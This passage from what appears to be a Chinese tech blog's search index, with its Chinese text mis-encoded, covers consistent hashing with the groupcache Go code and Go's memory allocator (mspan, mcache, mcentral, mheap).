ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œè¿™æ ·èƒ½èµ·åˆ°çš„å‡è¡¡æ•ˆæœå…¶å®å¾ˆæœ‰é™ã€‚è€Œåœ¨å®é™…çš„å·¥ç¨‹ä¸­ï¼Œè™šæ‹ŸèŠ‚ç‚¹çš„æ•°é‡ä¼šå¤§å¾ˆå¤šï¼Œæ¯”å¦‚ Nginx çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ï¼Œæ¯ä¸ªæƒé‡ä¸º 1 çš„çœŸå®èŠ‚ç‚¹å°±å«æœ‰160 ä¸ªè™šæ‹ŸèŠ‚ç‚¹ã€‚\n\næ¯”å¦‚ï¼Œå½“æŸä¸ªèŠ‚ç‚¹è¢«ç§»é™¤æ—¶ï¼Œå¯¹åº”è¯¥èŠ‚ç‚¹çš„å¤šä¸ªè™šæ‹ŸèŠ‚ç‚¹å‡ä¼šç§»é™¤ï¼Œè€Œè¿™äº›è™šæ‹ŸèŠ‚ç‚¹æŒ‰é¡ºæ—¶é’ˆæ–¹å‘çš„ä¸‹ä¸€ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå¯¹åº”ä¸åŒçš„çœŸå®èŠ‚ç‚¹ï¼Œå³è¿™äº›ä¸åŒçš„çœŸå®èŠ‚ç‚¹å…±åŒåˆ†æ‹…äº†èŠ‚ç‚¹å˜åŒ–å¯¼è‡´çš„å‹åŠ›ã€‚\n\n# 3. golangå®ç°\n\nhttps://github.com/golang/groupcache/blob/master/consistenthash/consistenthash.go\n\n```go\npackage consistenthash\n\nimport (\n\t\"hash/crc32\"\n\t\"sort\"\n\t\"strconv\"\n)\n\ntype Hash func(data []byte) uint32\n\ntype Map struct {\n\thash     Hash\n\treplicas int   // è™šæ‹ŸèŠ‚ç‚¹å¤šå°‘ä¸ªå¤‡ä»½\n\tkeys     []int // Sorted\n\thashMap  map[int]string\n}\n\nfunc New(replicas int, fn Hash) *Map {\n\tm := &Map{\n\t\treplicas: replicas,\n\t\thash:     fn,\n\t\thashMap:  make(map[int]string),\n\t}\n\tif m.hash == nil {\n\t\tm.hash = crc32.ChecksumIEEE\n\t}\n\treturn m\n}\n\n// IsEmpty returns true if there are no items available.\nfunc (m *Map) IsEmpty() bool {\n\treturn len(m.keys) == 0\n}\n\n// Add adds some keys to the hash.\nfunc (m *Map) Add(keys ...string) {\n\tfor _, key := range keys {\n\t\tfor i := 0; i < m.replicas; i++ {\n\t\t\thash := int(m.hash([]byte(strconv.Itoa(i) + key)))\n\t\t\tm.keys = append(m.keys, hash)\n\t\t\tm.hashMap[hash] = key\n\t\t}\n\t}\n\tsort.Ints(m.keys)\n}\n\n// Get gets the closest item in the hash to the provided key.\nfunc (m *Map) Get(key string) string {\n\tif m.IsEmpty() {\n\t\treturn \"\"\n\t}\n\n\thash := int(m.hash([]byte(key)))\n\n\t// Binary search for appropriate replica.\n\tidx := sort.Search(len(m.keys), func(i int) bool { return m.keys[i] >= hash })\n\n\t// Means we have cycled back to the first replica.\n\tif idx == len(m.keys) {\n\t\tidx = 0\n\t}\n\n\treturn m.hashMap[m.keys[idx]]\n}\n```\n\nhttps://github.com/golang/groupcache/blob/master/consistenthash/consistenthash_test.go\n\n```go\nfunc TestHashing(t *testing.T) {\n\n\t// Override the hash function to return easier to reason about values. Assumes\n\t// the keys can be converted to an integer.\n\thash := New(3, func(key []byte) uint32 {\n\t\ti, err := strconv.Atoi(string(key))\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\treturn uint32(i)\n\t})\n\n\t// Given the above hash function, this will give replicas with \"hashes\":\n\t// 2, 4, 6, 12, 14, 16, 22, 24, 26\n\thash.Add(\"6\", \"4\", \"2\")\n\n\ttestCases := map[string]string{\n\t\t\"2\":  \"2\",\n\t\t\"11\": \"2\",\n\t\t\"23\": \"4\",\n\t\t\"27\": \"2\",\n\t}\n\n\tfor k, v := range testCases {\n\t\tif hash.Get(k) != v {\n\t\t\tt.Errorf(\"Asking for %s, should have yielded %s\", k, v)\n\t\t}\n\t}\n\n\t// Adds 8, 18, 28\n\thash.Add(\"8\")\n\n\t// 27 should now map to 8.\n\ttestCases[\"27\"] = \"8\"\n\n\tfor k, v := range testCases {\n\t\tif hash.Get(k) != v {\n\t\t\tt.Errorf(\"Asking for %s, should have yielded %s\", k, v)\n\t\t}\n\t}\n\n}\n```\n\n# 4. æ€»ç»“\n\n+ è½®è¯¢è¿™ç±»çš„ç­–ç•¥åªèƒ½é€‚ç”¨ä¸æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®éƒ½æ˜¯ç›¸åŒçš„åœºæ™¯ï¼Œè®¿é—®ä»»æ„èŠ‚ç‚¹éƒ½èƒ½è¯·æ±‚åˆ°æ•°æ®ã€‚ä½†æ˜¯ä¸é€‚ç”¨åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå› ä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿæ„å‘³ç€æ•°æ®æ°´å¹³åˆ‡åˆ†åˆ°äº†ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œè®¿é—®æ•°æ®çš„æ—¶å€™ï¼Œä¸€å®šè¦å¯»å€å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹ã€‚\n+ å“ˆå¸Œç®—æ³•è™½ç„¶èƒ½å»ºç«‹æ•°æ®å’ŒèŠ‚ç‚¹çš„æ˜ å°„å…³ç³»ï¼Œä½†æ˜¯æ¯æ¬¡åœ¨èŠ‚ç‚¹æ•°é‡å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæœ€åæƒ…å†µä¸‹æ‰€æœ‰æ•°æ®éƒ½éœ€è¦è¿ç§»ï¼Œè¿™æ ·å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥ä¸é€‚ç”¨èŠ‚ç‚¹æ•°é‡å˜åŒ–çš„åœºæ™¯ã€‚\n+ ä¸€è‡´æ€§å“ˆå¸Œæ˜¯æŒ‡å°†ã€Œå­˜å‚¨èŠ‚ç‚¹ã€å’Œã€Œæ•°æ®ã€éƒ½æ˜ å°„åˆ°ä¸€ä¸ªé¦–å°¾ç›¸è¿çš„å“ˆå¸Œç¯ä¸Šï¼Œå¦‚æœå¢åŠ æˆ–è€…ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»…å½±å“è¯¥èŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šé¡ºæ—¶é’ˆç›¸é‚»çš„åç»§èŠ‚ç‚¹ï¼Œå…¶å®ƒæ•°æ®ä¹Ÿä¸ä¼šå—åˆ°å½±å“ã€‚\n+ ä¸ºäº†è§£å†³ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸èƒ½å¤Ÿå‡åŒ€çš„åˆ†å¸ƒèŠ‚ç‚¹çš„é—®é¢˜ï¼Œå°±éœ€è¦å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹ï¼Œå¯¹ä¸€ä¸ªçœŸå®èŠ‚ç‚¹åšå¤šä¸ªå‰¯æœ¬ã€‚ä¸å†å°†çœŸå®èŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œè€Œæ˜¯å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå¹¶å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å®é™…èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ã€Œä¸¤å±‚ã€æ˜ å°„å…³ç³»ã€‚\n\n# 5. å‚è€ƒèµ„æ–™ \n\n+ https://www.xiaolincoding.com/os/8_network_system/hash.html\n+ https://github.com/golang/groupcache/blob/master/consistenthash/consistenthash.go\n","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶","url":"%2Fp%2Fbfcff60d.html","content":"\n# 1. åŸºç¡€\n\n### 1.1 è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜\n\nç¨‹åºè¿è¡Œè¿›ç¨‹çš„æ€»å¤§å°å¯ä»¥è¶…è¿‡å®é™…å¯ç”¨çš„ç‰©ç†å†…å­˜çš„å¤§å°ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½å¯ä»¥æœ‰è‡ªå·±ç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ç„¶åé€šè¿‡CPUå’ŒMMUæŠŠè™šæ‹Ÿå†…å­˜åœ°å€è½¬æ¢ä¸ºå®é™…ç‰©ç†åœ°å€ã€‚\n\n<img src=\"golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/1.png\" alt=\"0\" style=\"zoom:80%;\" />\n\n<!-- more -->\n\næœ€é«˜ä½çš„1GBæ˜¯linuxå†…æ ¸ç©ºé—´ï¼Œç”¨æˆ·ä»£ç ä¸èƒ½å†™ï¼Œå¦åˆ™è§¦å‘æ®µé”™è¯¯ã€‚ä¸‹é¢çš„3GBæ˜¯è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ã€‚\n\n+ Kernel spaceï¼šlinuxå†…æ ¸ç©ºé—´å†…å­˜\n+ Stackï¼šè¿›ç¨‹æ ˆç©ºé—´ï¼Œç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ã€‚å®ƒå‘ä¸‹å¢é•¿ï¼Œç³»ç»Ÿè‡ªåŠ¨ç®¡ç†\n+ Memory Mapping Segmentï¼šå†…å­˜æ˜ å°„åŒºï¼Œé€šè¿‡mmapç³»ç»Ÿè°ƒç”¨ï¼Œå°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæˆ–è€…åŒ¿åæ˜ å°„ã€‚\n+ Heapï¼šå †ç©ºé—´ã€‚è¿™ä¸ªå°±æ˜¯ç¨‹åºé‡ŒåŠ¨æ€åˆ†é…çš„ç©ºé—´ã€‚linuxä¸‹ä½¿ç”¨mallocè°ƒç”¨æ‰©å±•ï¼ˆç”¨brk/sbrkæ‰©å±•å†…å­˜ç©ºé—´ï¼‰ï¼Œfreeå‡½æ•°é‡Šæ”¾ï¼ˆä¹Ÿå°±æ˜¯ç¼©å‡å†…å­˜ç©ºé—´ï¼‰\n+ BSSæ®µï¼šåŒ…å«æœªåˆå§‹åŒ–çš„é™æ€å˜é‡å’Œå…¨å±€å˜é‡\n+ Dataæ®µï¼šä»£ç é‡Œå·²åˆå§‹åŒ–çš„é™æ€å˜é‡ã€å…¨å±€å˜é‡\n+ Textæ®µï¼šä»£ç æ®µï¼Œè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶\n\n\n\n### 1.2 golangå†…å­˜é€ƒé€¸åˆ†æ\n\nC/C++ï¼Œæˆ‘ä»¬ä½¿ç”¨ malloc æˆ–è€… new ç”³è¯·çš„å˜é‡ä¼šè¢«åˆ†é…åˆ°å †ä¸Šã€‚ä½†æ˜¯ Golang å¹¶ä¸æ˜¯è¿™æ ·ï¼Œè™½ç„¶ Golang è¯­è¨€é‡Œé¢ä¹Ÿæœ‰ newã€‚Golang ç¼–è¯‘å™¨å†³å®šå˜é‡åº”è¯¥åˆ†é…åˆ°ä»€ä¹ˆåœ°æ–¹æ—¶ä¼šè¿›è¡Œé€ƒé€¸åˆ†æã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚\n\n```go\npackage main\n\nimport ()\n\nfunc foo() *int {\n    var x int\n    return &x\n}\n\nfunc bar() int {\n    x := new(int)\n    *x = 1\n    return *x\n}\n\nfunc main() {}\n```\n\nå°†ä¸Šé¢æ–‡ä»¶ä¿å­˜ä¸º main.goï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤\n\n```bash\n$ go run -gcflags '-m -l' main.go\n\n# command-line-arguments\n./main.go:4:6: moved to heap: x\n./main.go:9:10: new(int) does not escape\n```\n\n\nä¸Šé¢çš„æ„æ€æ˜¯ foo() ä¸­çš„ x æœ€ååœ¨å †ä¸Šåˆ†é…ï¼Œè€Œ bar() ä¸­çš„ x æœ€ååˆ†é…åœ¨äº†æ ˆä¸Šã€‚\n\n\nå¦‚ä½•å¾—çŸ¥å˜é‡æ˜¯åˆ†é…åœ¨æ ˆï¼ˆstackï¼‰ä¸Šè¿˜æ˜¯å †ï¼ˆheapï¼‰ä¸Šï¼Ÿå‡†ç¡®åœ°è¯´ï¼Œä½ å¹¶ä¸éœ€è¦çŸ¥é“ã€‚Golang ä¸­çš„å˜é‡åªè¦è¢«å¼•ç”¨å°±ä¸€ç›´ä¼šå­˜æ´»ï¼Œå­˜å‚¨åœ¨å †ä¸Šè¿˜æ˜¯æ ˆä¸Šç”±å†…éƒ¨å®ç°å†³å®šè€Œå’Œå…·ä½“çš„è¯­æ³•æ²¡æœ‰å…³ç³»ã€‚\n\n# 2. golangå†…å­˜ç®¡ç†\n\n### 2.1 TCMallocç®—æ³•\n\nGolangè¿è¡Œæ—¶çš„å†…å­˜åˆ†é…ç®—æ³•ä¸»è¦æºè‡ª Google ä¸º C è¯­è¨€å¼€å‘çš„ TCMalloc ç®—æ³•ï¼Œå…¨ç§°Thread-Caching Mallocã€‚\n\næ ¸å¿ƒæ€æƒ³å°±æ˜¯æŠŠå†…å­˜åˆ†ä¸ºå¤šçº§ç®¡ç†ï¼Œä»è€Œé™ä½é”çš„ç²’åº¦ã€‚å®ƒå°†å¯ç”¨çš„å †å†…å­˜é‡‡ç”¨äºŒçº§åˆ†é…çš„æ–¹å¼è¿›è¡Œç®¡ç†ï¼šæ¯ä¸ªçº¿ç¨‹éƒ½ä¼šè‡ªè¡Œç»´æŠ¤ä¸€ä¸ªç‹¬ç«‹çš„å†…å­˜æ± ï¼Œè¿›è¡Œå†…å­˜åˆ†é…æ—¶ä¼˜å…ˆä»è¯¥å†…å­˜æ± ä¸­åˆ†é…ï¼Œå½“å†…å­˜æ± ä¸è¶³æ—¶æ‰ä¼šå‘å…¨å±€å†…å­˜æ± ç”³è¯·ï¼Œä»¥é¿å…ä¸åŒçº¿ç¨‹å¯¹å…¨å±€å†…å­˜æ± çš„é¢‘ç¹ç«äº‰ã€‚\n\n![1](golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/4.png)\n\n\n\n### 2.2 å†…å­˜ç®¡ç†å•å…ƒmspan\n\nGoé»˜è®¤é‡‡ç”¨8192B(8KB)å¤§å°çš„é¡µï¼Œé¡µçš„ç²’åº¦ä¿æŒä¸º8KBã€‚\n\nä½†æ˜¯æœ‰çš„å˜é‡å¾ˆå°å°±æ˜¯æ•°å­—ï¼Œæœ‰çš„å´æ˜¯ä¸€ä¸ªå¤æ‚çš„ç»“æ„ä½“ï¼Œæ‰€ä»¥åŸºäºTCMallocæ¨¡å‹çš„Goè¿˜å°†å†…å­˜é¡µåˆ†ä¸º67ä¸ªä¸åŒå¤§å°çº§åˆ«ï¼Œä»8å­—èŠ‚åˆ°32KBåˆ†äº†67 ç§( 8 byte, 16 byte....32KBï¼‰ã€‚\n\nä¾‹å¦‚ä¸‹å›¾, å°†8 KBé¡µ åˆ’åˆ†ä¸º1KBçš„å¤§å°ç­‰çº§ã€‚\n\n![img{512x368}](golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/3.png)\n\n\n\n`mspan`ï¼šGoä¸­å†…å­˜ç®¡ç†çš„åŸºæœ¬å•å…ƒï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«é¡µé¢çš„èµ·å§‹åœ°å€ï¼Œå®ƒå…·æœ‰çš„é¡µé¢çš„spanç±»ä»¥åŠå®ƒåŒ…å«çš„é¡µé¢æ•°ã€‚\n\n```go\n// path: /usr/local/go/src/runtime/mheap.go\n\ntype mspan struct {\n   \n    next *mspan  //é“¾è¡¨åå‘æŒ‡é’ˆï¼Œç”¨äºå°†spané“¾æ¥èµ·æ¥\n   \n    prev *mspan   //é“¾è¡¨å‰å‘æŒ‡é’ˆï¼Œç”¨äºå°†spané“¾æ¥èµ·æ¥\n \n    startAddr uintptr  // èµ·å§‹åœ°å€ï¼Œä¹Ÿå³æ‰€ç®¡ç†é¡µçš„åœ°å€\n  \n    npages uintptr    // ç®¡ç†çš„é¡µæ•°\n \n    nelems uintptr    // å—ä¸ªæ•°ï¼Œè¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå—å¯ä¾›åˆ†é…\n\n   \n    allocBits *gcBits  //åˆ†é…ä½å›¾ï¼Œæ¯ä¸€ä½ä»£è¡¨ä¸€ä¸ªå—æ˜¯å¦å·²åˆ†é…\n\n    \n    allocCount uint16 // å·²åˆ†é…å—çš„ä¸ªæ•°\n \n    spanclass spanClass     // classè¡¨ä¸­çš„class IDï¼Œå’ŒSize Classsç›¸å…³\n\n\n    elemsize uintptr     // classè¡¨ä¸­çš„å¯¹è±¡å¤§å°ï¼Œä¹Ÿå³å—å¤§å°\n}\n```\n\n### 2.3 GMPçš„ P ç»‘å®šä¸€ä¸ª mcache\n\nmcacheå¯ä»¥ä¸ºgolangä¸­æ¯ä¸ª Processorï¼ˆGMPæ¨¡å‹çš„Pï¼‰ æä¾›å†…å­˜cacheä½¿ç”¨ï¼Œæ¯ä¸€ä¸ªmcacheçš„ç»„æˆå•ä½ä¹Ÿæ˜¯mspanã€‚\n\næˆ‘ä»¬çŸ¥é“æ¯ä¸ª Gorontine çš„è¿è¡Œéƒ½æ˜¯ç»‘å®šåˆ°ä¸€ä¸ª P ä¸Šé¢ï¼Œmcache æ˜¯æ¯ä¸ª P çš„ cacheã€‚è¿™ä¹ˆåšçš„å¥½å¤„æ˜¯åˆ†é…å†…å­˜æ—¶ä¸éœ€è¦åŠ é”ã€‚\n\n```go\n// Per-thread (in Go, per-P) cache for small objects.\n// No locking needed because it is per-thread (per-P).\ntype mcache struct {\n    // The following members are accessed on every malloc,\n    // so they are grouped here for better caching.\n    next_sample int32   // trigger heap sample after allocating this many bytes\n    local_scan  uintptr // bytes of scannable heap allocated\n\n    // å°å¯¹è±¡åˆ†é…å™¨ï¼Œå°äº 16 byte çš„å°å¯¹è±¡éƒ½ä¼šé€šè¿‡ tiny æ¥åˆ†é…ã€‚\n    tiny             uintptr\n    tinyoffset       uintptr\n    local_tinyallocs uintptr // number of tiny allocs not counted in other stats\n\n    // The rest is not accessed on every malloc.\n    alloc [_NumSizeClasses]*mspan // spans to allocate from\n\n    stackcache [_NumStackOrders]stackfreelist\n\n    // Local allocator stats, flushed during GC.\n    local_nlookup    uintptr                  // number of pointer lookups\n    local_largefree  uintptr                  // bytes freed for large objects (>maxsmallsize)\n    local_nlargefree uintptr                  // number of frees for large objects (>maxsmallsize)\n    local_nsmallfree [_NumSizeClasses]uintptr // number of frees for small objects (<=maxsmallsize)\n}\n```\n\nè§£é‡Š:\n```bash\nalloc [_NumSizeClasses]*mspan\n_NumSizeClasses = 67, æ¯ä¸ªæ•°ç»„å…ƒç´ ç”¨æ¥åŒ…å«ç‰¹å®šå¤§å°çš„å—ã€‚67 ç§å—å¤§å°ä¸º 0ï¼Œ8 byte, 16 byte....32KB\n\nvar class_to_size = [_NumSizeClasses]uint16{0, 8, 16, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 288, 320, 352, 384, 416, 448, 480, 512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1408, 1536, 1792, 2048, 2304, 2688, 3072, 3200, 3456, 4096, 4864, 5376, 6144, 6528, 6784, 6912, 8192, 9472, 9728, 10240, 10880, 12288, 13568, 14336, 16384, 18432, 19072, 20480, 21760, 24576, 27264, 28672, 32768}\n```\n\n\n\nä¾‹å¦‚: ç”³è¯·32å­—èŠ‚å†…å­˜,  32bçš„è¿™ç§`mspan`èƒ½æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆåˆ†é…å†…å­˜çš„æ—¶å€™å°±ä¼šç»™å®ƒåˆ†é…ä¸€ä¸ª32å­—èŠ‚å¤§å°çš„`mspan`ã€‚\n\n![11](golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/5.png)\n\n### 2.4 çº¿ç¨‹å…±äº« mcentral\n\nå½“å·¥ä½œçº¿ç¨‹çš„`mcache`ä¸­æ²¡æœ‰åˆé€‚ï¼ˆä¹Ÿå°±æ˜¯ç‰¹å®šå¤§å°çš„ï¼‰çš„`mspan`æ—¶å°±ä¼šä»`mcentral` å»è·å–ã€‚`mcentral`è¢«æ‰€æœ‰çš„å·¥ä½œçº¿ç¨‹å…±åŒäº«æœ‰ï¼Œå­˜åœ¨å¤šä¸ª`goroutine`ç«äº‰çš„æƒ…å†µï¼Œå› æ­¤ä»`mcentral`è·å–èµ„æºæ—¶éœ€è¦åŠ é”ã€‚\n\nmcentralé‡Œæœ‰ä¸¤ä¸ªåŒå‘é“¾è¡¨ï¼Œä¸€ä¸ªé“¾è¡¨è¡¨ç¤ºè¿˜æœ‰ç©ºé—²çš„mspanå¾…åˆ†é…ï¼Œä¸€ä¸ªè¡¨ç¤ºé“¾è¡¨é‡Œçš„mspanéƒ½è¢«åˆ†é…äº†ã€‚\n\n```go\ntype mcentral struct {\n    lock      mutex\n    sizeclass int32\n    nonempty  mSpanList // list of spans with a free object, ie a nonempty free list\n    empty     mSpanList // list of spans with no free objects (or cached in an mcache)\n}\n\ntype mSpanList struct {\n    first *mspan\n    last  *mspan\n}\n\n```\n\nè§£é‡Š\n\n```bash\nsizeclass: 0 ~ _NumSizeClasses ä¹‹é—´çš„ä¸€ä¸ªå€¼ã€‚\nlock: å› ä¸ºä¼šæœ‰å¤šä¸ª P è¿‡æ¥ç«äº‰ã€‚\nnonempty: mspan çš„åŒå‘é“¾è¡¨ï¼Œå½“å‰ mcentral ä¸­å¯ç”¨çš„ mspan listã€‚\nempty: å·²ç»è¢«ä½¿ç”¨çš„ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç§å¯¹æ‰€æœ‰ mspan çš„ trackã€‚\n```\n\n`mcentral`é‡Œç»´æŠ¤ç€ä¸¤ä¸ªåŒå‘é“¾è¡¨ï¼Œnonemptyè¡¨ç¤ºé“¾è¡¨é‡Œè¿˜æœ‰ç©ºé—²çš„`mspan`å¾…åˆ†é…ã€‚emptyè¡¨ç¤ºè¿™æ¡é“¾è¡¨é‡Œçš„`mspan`éƒ½è¢«åˆ†é…äº†`object`ã€‚\n\n![12](golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/6.png)\n\n`mcache`ä»`mcentral`è·å–å’Œå½’è¿˜`mspan`çš„æµç¨‹ï¼š\n\n- è·å– åŠ é”ï¼›ä»`nonempty`é“¾è¡¨æ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„`mspan`ï¼›å¹¶å°†å…¶ä»`nonempty`é“¾è¡¨åˆ é™¤ï¼›å°†å–å‡ºçš„`mspan`åŠ å…¥åˆ°`empty`é“¾è¡¨ï¼›å°†`mspan`è¿”å›ç»™å·¥ä½œçº¿ç¨‹ï¼›è§£é”ã€‚\n- å½’è¿˜ åŠ é”ï¼›å°†`mspan`ä»`empty`é“¾è¡¨åˆ é™¤ï¼›å°†`mspan`åŠ å…¥åˆ°`nonempty`é“¾è¡¨ï¼›è§£é”ã€‚\n\n\n\n### 2.5 å¤§å†…å­˜ mheap\n\nmheapè´Ÿè´£å¤§å†…å­˜çš„åˆ†é…ã€‚å½“mcentralå†…å­˜ä¸å¤Ÿæ—¶ï¼Œå¯ä»¥å‘mheapç”³è¯·ã€‚é‚£mheapæ²¡æœ‰å†…å­˜èµ„æºå‘¢ï¼Ÿè·Ÿtcmallocä¸€æ ·ï¼Œå‘OSæ“ä½œç³»ç»Ÿç”³è¯·ã€‚\n\nè¿˜æœ‰ï¼Œå¤§äº32KBçš„å†…å­˜ï¼Œä¹Ÿæ˜¯ç›´æ¥å‘mheapç”³è¯·ã€‚\n\n<img src=\"golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/38720_10.png\" alt=\"å…¨å±€å›¾\" style=\"zoom:70%;\" />\n\n```go\ntype mheap struct {\n    lock      mutex\n    free      [_MaxMHeapList]mSpanList // free lists of given length\n    freelarge mSpanList                // free lists length >= _MaxMHeapList\n    busy      [_MaxMHeapList]mSpanList // busy lists of large objects of given length\n    busylarge mSpanList                // busy lists of large objects length >= _MaxMHeapList\n    sweepgen  uint32                   // sweep generation, see comment in mspan\n    sweepdone uint32                   // all spans are swept\n\n   \n    allspans []*mspan // all spans out there\n    spans []*mspan\n    sweepSpans [2]gcSweepBuf\n\n    _ uint32 // align uint64 fields on 32-bit for atomics\n\n    // Proportional sweep\n    pagesInUse        uint64  // pages of spans in stats _MSpanInUse; R/W with mheap.lock\n    spanBytesAlloc    uint64  // bytes of spans allocated this cycle; updated atomically\n    pagesSwept        uint64  // pages swept this cycle; updated atomically\n    sweepPagesPerByte float64 // proportional sweep ratio; written with lock, read without\n    // TODO(austin): pagesInUse should be a uintptr, but the 386\n    // compiler can't 8-byte align fields.\n\n    // Malloc stats.\n    largefree  uint64                  // bytes freed for large objects (>maxsmallsize)\n    nlargefree uint64                  // number of frees for large objects (>maxsmallsize)\n    nsmallfree [_NumSizeClasses]uint64 // number of frees for small objects (<=maxsmallsize)\n\n    // range of addresses we might see in the heap\n    bitmap         uintptr // Points to one byte past the end of the bitmap\n    bitmap_mapped  uintptr\n    arena_start    uintptr\n    arena_used     uintptr // always mHeap_Map{Bits,Spans} before updating\n    arena_end      uintptr\n    arena_reserved bool\n\n    // central free lists for small size classes.\n    // the padding makes sure that the MCentrals are\n    // spaced CacheLineSize bytes apart, so that each MCentral.lock\n    // gets its own cache line.\n    central [_NumSizeClasses]struct {\n        mcentral mcentral\n        pad      [sys.CacheLineSize]byte\n    }\n\n    spanalloc             fixalloc // allocator for span*\n    cachealloc            fixalloc // allocator for mcache*\n    specialfinalizeralloc fixalloc // allocator for specialfinalizer*\n    specialprofilealloc   fixalloc // allocator for specialprofile*\n    speciallock           mutex    // lock for special record allocators.\n}\n\nvar mheap_ mheap  // mheap_ æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä¼šåœ¨ç³»ç»Ÿåˆå§‹åŒ–çš„æ—¶å€™åˆå§‹åŒ–\n```\n\n`mheap`é‡Œçš„`arena` åŒºåŸŸæ˜¯çœŸæ­£çš„å †åŒºï¼Œè¿è¡Œæ—¶ä¼šå°† `8KB` çœ‹åšä¸€é¡µï¼Œè¿™äº›å†…å­˜é¡µä¸­å­˜å‚¨äº†æ‰€æœ‰åœ¨å †ä¸Šåˆå§‹åŒ–çš„å¯¹è±¡ã€‚\n\n![12](golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/2.png)\n\n# 3. golangå†…å­˜åˆ†é…\n\nGoå†…å­˜ç®¡ç†çš„åŸºæœ¬å•å…ƒæ˜¯mspanï¼Œæ¯ç§mspanå¯ä»¥åˆ†é…ç‰¹å®šå¤§å°çš„objectã€‚\n\nmcache, mcentral, mheapæ˜¯ Go å†…å­˜ç®¡ç†çš„ä¸‰å¤§ç»„ä»¶ï¼Œ mcache ç®¡ç†çº¿ç¨‹åœ¨æœ¬åœ°ç¼“å­˜çš„ mspanï¼›mcentral ç®¡ç†å…¨å±€çš„ mspanä¾›æ‰€æœ‰çº¿ç¨‹ä½¿ç”¨ï¼›mheapç®¡ç† Goçš„æ‰€æœ‰åŠ¨æ€åˆ†é…å†…å­˜ã€‚\n\n### 3.1 åˆ†é…ç­–ç•¥\n\n- Goåœ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šå‘æ“ä½œç³»ç»Ÿç”³è¯·ä¸€å¤§å—å†…å­˜ï¼Œç”±`mheap`ç»“æ„å…¨å±€ç®¡ç†ã€‚\n\n- object size < 16 byteï¼Œä½¿ç”¨ mcache çš„å°å¯¹è±¡åˆ†é…å™¨ tiny ç›´æ¥åˆ†é…ã€‚ \n\n  object size > 16 byte && size <=32K byte æ—¶ï¼Œå…ˆä½¿ç”¨ mcache ä¸­å¯¹åº”çš„ size class åˆ†é…ã€‚\n\n  object size > 32Kï¼Œåˆ™ä½¿ç”¨ mheap ç›´æ¥åˆ†é…ã€‚\n\n- å¦‚æœ mcache å¯¹åº”çš„ size class çš„ span å·²ç»æ²¡æœ‰å¯ç”¨çš„å—ï¼Œåˆ™å‘ mcentral è¯·æ±‚ã€‚\n\n  å¦‚æœ mcentral ä¹Ÿæ²¡æœ‰å¯ç”¨çš„å—ï¼Œåˆ™å‘ mheap ç”³è¯·ã€‚\n\n  å¦‚æœ mheap ä¹Ÿæ²¡æœ‰åˆé€‚çš„ spanï¼Œåˆ™æƒ³æ“ä½œç³»ç»Ÿç”³è¯·ã€‚\n\n<img src=\"golangå†…å­˜ç®¡ç†å’Œåˆ†é…æœºåˆ¶/128821054-6f48a32f-34a3-494c-aedc-d079ba782c1c.png\" alt=\"image\" style=\"zoom:50%;\" />\n\n### 3.2 å¤´è„‘é£æš´\n\n+ é¦–å…ˆæ˜¯è¿›ç¨‹è™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜æ˜ å°„ï¼Œç”¨çš„éƒ½æ˜¯è™šæ‹Ÿåœ°å€ã€‚\n+ Goå€Ÿé‰´çš„TCMallocç®—æ³•ï¼ŒæŠŠå†…å­˜å¤šçº§ç®¡ç†ï¼Œmheapï¼Œmcentralï¼Œmcache(å¯¹åº”GMPçš„P)ã€‚\n+ 